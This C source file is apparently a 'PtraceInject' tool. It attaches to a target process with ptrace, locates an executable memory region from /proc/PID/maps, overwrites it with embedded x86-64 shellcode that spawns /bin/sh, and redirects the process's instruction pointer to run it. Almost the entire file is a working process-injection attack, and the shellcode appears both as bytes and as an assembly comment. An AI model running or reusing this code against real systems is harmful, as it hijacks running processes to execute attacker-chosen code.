#include <stdio.h>
#include <errno.h>
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/ptrace.h>

#define PID_MAX 32768
#define PID_MAX_STR_LENGTH 64

/*
--- Execute /bin/sh (27 bytes) ---

rdi 0x4005c4 0x4005c4              ;0x4005c4: "/bin/sh"
rsi 0x7fffffffdf40 0x7fffffffdf40  ;0x7fffffffdf40: "\304\005@"
rdx 0x0 0x0

main:
    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    push rsp
    pop rsi
    mov al, 0x3b
    syscall
 */


const char *SHELLCODE = "\x31\xc0\x48\xbb\xd1\x9d\x96"
                        "\x91\xd0\x8c\x97\xff\x48\xf7"
                        "\xdb\x53\x54\x5f\x99\x52\x57"
                        "\x54\x5e\xb0\x3b\x0f\x05";


// Function to retrieve the maximum process ID limit
int get_proc_pid_max() {
    // Open the pid_max file to read the maximum process ID limit
    FILE *pid_max_file = fopen("/proc/sys/kernel/pid_max", "r");
    if (pid_max_file == NULL) {
        printf("Could not find proc/sys/kernel/pid_max file, Using default PID\n");
        return PID_MAX;
    }
    
    // Allocate memory to hold the PID max value
    char *pid_max_buffer = malloc(PID_MAX_STR_LENGTH * sizeof(char));
    // Read the value from the file
    if (fgets(pid_max_buffer, PID_MAX_STR_LENGTH * sizeof(char), pid_max_file) == NULL) {
        printf("Could not read from /proc/sys/kernel/pid_max file, Using default PID\n");

        fclose(pid_max_file); // Close the file pointer to free resources
        free(pid_max_buffer); // Free the allocated memory for the buffer
        return PID_MAX;       // Return the default PID max value
    }
    
    // Convert the string buffer to a long integer using base 10
    long pid_max = strtol(pid_max_buffer, (char **)NULL, 10);
    if (pid_max == 0) {
        printf("Could not parse /proc/sys/kernel/pid_max value, Uisng default PID\n");
        pid_max = PID_MAX;
    }

    free(pid_max_buffer); // Free the allocated memory for the PID max buffer
    fclose(pid_max_file); // Close the file pointer to release the resource
    return pid_max;       // Return the parsed maximum PID value
}

// Function to extract permissions from a memory mapping line
char *get_permissions_from_line(char *line) {
    int first_space = -1;  // Initialize index for the first space
    int second_space = -1; // Initialize index for the second space

    // Iterate through the line
    for (size_t i = 0; i < strlen(line); i++) {
        // Check for the first space in the line
        if (line[i] == ' ' && first_space == -1) {
            first_space = i + 1; // Set first_space to the character after the space
        }
        // Check for a second space after the first
        else if (line[i] == ' ' && first_space != -1) {
            second_space = i; // Set second_space to the current index
            break;
        }
    }
    
    // Check if valid spaces were found
    if (first_space != -1 && second_space != -1 && second_space > first_space) {
        // Allocate memory for the permissions string
        char *permissions = malloc(second_space - first_space + 1);
        
        // Check if memory allocation was successful
        if (permissions == NULL) {
            printf("Could not allocate memory (%d: %s)\n", errno, strerror(errno));
            return NULL;
        }

        // Copy the permissions substring
        for (size_t i = first_space, j = 0; i < (size_t)second_space; i++, j++) {
            permissions[j] = line[i]; // Assign each character to the permissions array
        }
        permissions[second_space - first_space] = '\0'; // Null-terminate the permissions string
        return permissions;
    }
    return NULL;
}

// Function to extract a memory address from a line
long get_address_from_line(char *line) {
    // Initialize index for the last occurrence of hyphen
    int address_last_occurance_index = -1;
    
    // Iterate through the line
    for (size_t i = 0; i < strlen(line); i++) {
        // Check for hyphen in the line
        if (line[i] == '-') {
            address_last_occurance_index = i; // Update the index to the current position
        }    
    }
    
    // Check if no hyphen was found
    if (address_last_occurance_index == -1) {
        printf("Could not parse address from line '%s' (%d: %s)\n", errno, strerror(errno));
        return -1;
    }

    // Allocate memory for the address substring
    char *address_line = malloc(address_last_occurance_index + 1);
    if (address_line == NULL) {
        printf("Could not allocate memory (%d: %s)\n", errno, strerror(errno));
        return -1;
    }

    // Copy the address substring
    for (size_t i = 0; i < (size_t)address_last_occurance_index; i++) {
        address_line[i] = line[i]; // Assign each character to the address_line array
    }
    
    address_line[address_last_occurance_index] = '\0'; // Null-terminate the address string
    long address = strtol(address_line, (char **) NULL, 16); // Convert the string to a long integer in base 16
    return address;
}

// Function to parse the memory maps of a target process
long parse_maps_file(long victim_pid) {
    // Determine the length for the maps file name
    size_t maps_file_name_length = PID_MAX_STR_LENGTH + 12;
    // Allocate memory for the maps file name
    char *maps_file_name = malloc(maps_file_name_length);

    // Format the file path
    if (snprintf(maps_file_name, maps_file_name_length, "/proc/%ld/maps", victim_pid) < 0) {
        printf("Could not use snprintf (%d: %s)\n", errno, strerror(errno));
        return -1;
    }

    // Open the maps file for reading
    FILE *maps_file = fopen(maps_file_name, "r");
    if (maps_file == NULL) {
        printf("Could not open %s file (%d: %s)\n", maps_file_name, errno, strerror(errno));
        return -1;
    }
    
    // Initialize a pointer for reading lines from the maps file
    char *maps_line = NULL;
     // Initialize line length variable
    size_t maps_line_length = 0;

    // Read each line from the maps file
    while (getline(&maps_line, &maps_line_length, maps_file) != -1) {
        // Get permissions from the current line
        char *permissions = get_permissions_from_line(maps_line);
        if (permissions == NULL) {
            continue; // Skip to the next line
        
        // Check if permissions match "r-xp"
        } else if (strncmp("r-xp", permissions, 4) == 0) {
            printf(" Found section mapped with %s permissions\n", permissions);
            free(permissions); // Free allocated permissions memory
            break;
        }
        free(permissions); // Free permissions memory if not needed
    }
    // Get the memory address from the final line read
    long address = get_address_from_line(maps_line);
    free(maps_line); // Free memory allocated for the line buffer
    
    return address;  // Return the extracted address
}

int main(int argc, const char *argv[]) {
    if (argc < 2) {
        printf("Usage: PtraceInject <PID>\n");
        return 1;
    }

    // Retrieve the maximum process ID
    long pid_max = get_proc_pid_max();
    // Convert the input string to a long PID
    long victim_pid = strtol(argv[1], (char **) NULL, 10);
    if (victim_pid == 0 || victim_pid > pid_max) {
        printf("PID is not a valid number (%d: %s)\n", errno, strerror(errno));
        return 1;
    }

    // Attach to the victim process.
    if (ptrace(PTRACE_ATTACH, victim_pid, NULL, NULL) < 0) {
        printf("Failed to PTRACE_ATTACH (%d: %s)\n", errno, strerror(errno));
        return 1;
    }
    wait(NULL); // Wait for the victim process to stop

    // Save old register state.
    struct user_regs_struct old_regs; // Structure to hold the original register state

    // Get the current register state
    if (ptrace(PTRACE_GETREGS, victim_pid, NULL, &old_regs) < 0) {
        printf("Failed to PTRACE_GETREGS (%d: %s)\n", errno, strerror(errno));
        return 1;
    }

    // Parse the memory map to find an injection address
    long address = parse_maps_file(victim_pid);
    
    size_t payload_size = strlen(SHELLCODE);   // Determine the size of the shellcode
    uint64_t *payload = (uint64_t *)SHELLCODE; // Cast shellcode to a uint64_t pointer

    printf("Injecting payload at address 0x%lx.\n", address);

    // Inject shellcode
    for (size_t i = 0; i < payload_size; i += 8, payload++) {
        // Write payload to target process
        if (ptrace(PTRACE_POKETEXT, victim_pid, address + i, *payload) < 0) {
            printf("Failed to PTRACE_POKETEXT (%d: %s)\n", errno, strerror(errno));
            return 1;
        }
    }

    // Create a structure to modify register state
    struct user_regs_struct regs;
    // Copy the old register state
    memcpy(&regs, &old_regs, sizeof(struct user_regs_struct));
    // Set the instruction pointer to the injection address
    regs.rip = address;

    // Update the register state
    if (ptrace(PTRACE_SETREGS, victim_pid, NULL, &regs) < 0) {
        printf("Failed to PTRACE_SETREGS (%d: %s)\n", errno, strerror(errno));
        return 1;
    }

    // Continue the execution of the victim process
    if (ptrace(PTRACE_CONT, victim_pid, NULL, NULL) < 0) {
        printf("Failed to PTRACE_CONT (%d: %s)\n", errno, strerror(errno));
        return 1;
    }

    printf("Successfully injected and jumped to the code\n");
    return 0;
}